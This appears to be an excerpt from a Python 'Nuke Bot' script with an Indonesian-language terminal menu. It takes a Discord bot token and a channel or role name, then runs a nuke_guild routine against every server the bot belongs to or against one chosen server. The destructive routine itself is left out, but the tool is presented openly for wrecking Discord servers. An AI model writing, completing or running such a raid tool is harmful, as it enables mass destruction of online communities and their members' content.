...
{c}--------------------------------------------
{b}[Menu]
    {y}└─>[1] {m}- {g}Jalankan Setup Nuke Bot
    {y}└─>[2] {m}- {g}Keluar
{y}====>{g}''')
    if choice == '1':
        token = _input(f'{y}Taro bot token:{g}')
        name = _input(f'{y}Tulis nama channel / roles:{g}')
        clear()
        choice_type = _input(f'''
{baner}                
{c}--------------------------------------------
{b}[Select]
    {y}└─[1] {m}- {g}Nuke semua server.
    {y}└─[2] {m}- {g}Nuke server pilihan.  
    {y}└─[3] {m}- {g}Keluar
{y}====>{g}''')
        ...
        if choice_type == '1':
            ...
            async def on_ready():
                print(f'''
[+]Masuk ke {client.user.name}
[+]Bot di {len(client.guilds)} servers!''')
                for guild in client.guilds:
                    await nuke_guild(guild)
                await client.close()
        elif choice_type == '2':
            guild_id =  _input(f'{y}IPasang server id:{g}')
            @client.event
            async def on_ready():
                for guild in client.guilds:
        ...
        try:
            client.run(token)
            input('Nuke selesai, tekan enter untuk kembali ke menu...')
